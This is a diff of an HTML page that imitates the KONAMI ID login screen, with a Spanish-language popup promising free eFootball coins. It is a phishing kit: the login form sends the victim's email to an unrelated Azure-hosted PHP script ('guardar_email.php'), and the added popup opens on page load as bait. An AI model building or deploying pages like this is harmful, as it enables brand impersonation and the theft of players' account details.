@@ -22,7 +22,6 @@
         }
 
         /* HEADER */
-
         .header{
             background:white;
             height:60px;
@@ -39,7 +38,6 @@
         }
 
         /* CONTENIDO */
-
         .container{
             flex:1;
             display:flex;
@@ -64,7 +62,6 @@
         }
 
         /* NOTICE */
-
         .notice{
             border:1px solid #ff4d4d;
             border-radius:5px;
@@ -80,7 +77,6 @@
         }
 
         /* INPUT */
-
         input{
             width:100%;
             padding:18px;
@@ -91,7 +87,6 @@
         }
 
         /* BOTON */
-
         button{
             width:250px;
             height:55px;
@@ -111,7 +106,6 @@
         }
 
         /* OR */
-
         .or{
             display:flex;
             align-items:center;
@@ -131,7 +125,6 @@
         }
 
         /* PASSKEY */
-
         .passkey-btn{
             width:350px;
             margin:auto;
@@ -161,7 +154,6 @@
         }
 
         /* REGISTER */
-
         .register{
             text-align:center;
             margin-top:40px;
@@ -175,7 +167,6 @@
         }
 
         /* FOOTER */
-
         .footer{
             background:white;
             height:70px;
@@ -187,53 +178,107 @@
             font-size:14px;
         }
 
+        /* ================= POPUP ================= */
+
+        .overlay{
+            position:fixed;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            background:rgba(0,0,0,0.6);
+            display:none;
+            justify-content:center;
+            align-items:center;
+            z-index:999;
+        }
+
+        .card{
+            background:white;
+            width:340px;
+            border-radius:20px;
+            padding:25px;
+            text-align:center;
+            position:relative;
+        }
+
+        .title{
+            font-size:20px;
+            font-weight:bold;
+            margin-bottom:10px;
+        }
+
+        .info{
+            color:red;
+            font-weight:bold;
+        }
+
+        .coin{
+            font-size:60px;
+            margin:20px 0;
+        }
+
+        .free{
+            background:hotpink;
+            color:white;
+            padding:5px 10px;
+            border-radius:10px;
+            display:inline-block;
+        }
+
+        .btn{
+            margin-top:20px;
+            width:100%;
+            padding:12px;
+            border:2px solid red;
+            background:white;
+            color:red;
+            font-size:18px;
+            border-radius:10px;
+            cursor:pointer;
+        }
+
+        .btn:hover{
+            background:red;
+            color:white;
+        }
+
+        .close{
+            position:absolute;
+            top:10px;
+            right:15px;
+            cursor:pointer;
+            font-size:18px;
+        }
+
     </style>
 </head>
+
 <body>
 
     <!-- HEADER -->
-
     <div class="header">
         <div class="logo">KONAMI</div>
     </div>
 
     <!-- CONTENIDO -->
-
     <div class="container">
 
         <div class="login-box">
 
             <h1>KONAMI ID</h1>
 
-            <!-- NOTICE -->
-
             <div class="notice">
                 ▶ Notice of Service Termination in Russia and Belarus
             </div>
 
-            <!-- FORM -->
-
             <form action="https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_email.php" method="POST">
 
-                <!-- INPUT -->
+                <input type="email" name="email" placeholder="KONAMI ID / E-mail address" required>
 
-                <input
-                    type="email"
-                    name="email"
-                    id="email"
-                    placeholder="KONAMI ID / E-mail address"
-                    required
-                >
-
-                <!-- BOTON -->
-
-                <button type="submit">
-                    Log In
-                </button>
+                <button type="submit">Log In</button>
 
             </form>
-
-            <!-- OR -->
 
             <div class="or">
                 <div class="line"></div>
@@ -241,26 +286,15 @@
                 <div class="line"></div>
             </div>
 
-            <!-- PASSKEY -->
-
-            <div class="passkey-btn">
-                🔑 Logging in With a Passkey
-            </div>
+            <div class="passkey-btn">🔑 Logging in With a Passkey</div>
 
             <div class="passkey-link">
-                <a href="#">
-                    What is a Passkey?
-                </a>
+                <a href="#">What is a Passkey?</a>
             </div>
-
-            <!-- REGISTER -->
 
             <div class="register">
                 Don't have a KONAMI ID?<br><br>
-
-                <a href="#">
-                    Register
-                </a>
+                <a href="#">Register</a>
             </div>
 
         </div>
@@ -268,13 +302,50 @@
     </div>
 
     <!-- FOOTER -->
-
     <div class="footer">
         <span>Terms of Use / Privacy</span>
         <span>Trademarks</span>
         <span>Support</span>
         <span>Company Information</span>
     </div>
+
+    <!-- ================= POPUP 300 MONEDAS ================= -->
+    <div class="overlay" id="overlay">
+        <div class="card">
+
+            <div class="close" onclick="closePopup()">✖</div>
+
+            <div class="title">
+                [Gratis] 300 Monedas de eFootball™
+                <span class="info">ⓘ</span>
+            </div>
+
+            <div>Limit: 1 / week</div>
+
+            <div class="coin">🪙</div>
+
+            <div class="free">Free!</div>
+
+            <button class="btn" onclick="claim()">Reclamar</button>
+
+        </div>
+    </div>
+
+    <!-- SCRIPT -->
+    <script>
+        window.onload = function(){
+            document.getElementById("overlay").style.display = "flex";
+        }
+
+        function closePopup(){
+            document.getElementById("overlay").style.display = "none";
+        }
+
+        function claim(){
+            alert("¡Reclamaste 300 monedas!");
+            closePopup();
+        }
+    </script>
 
 </body>
 </html>
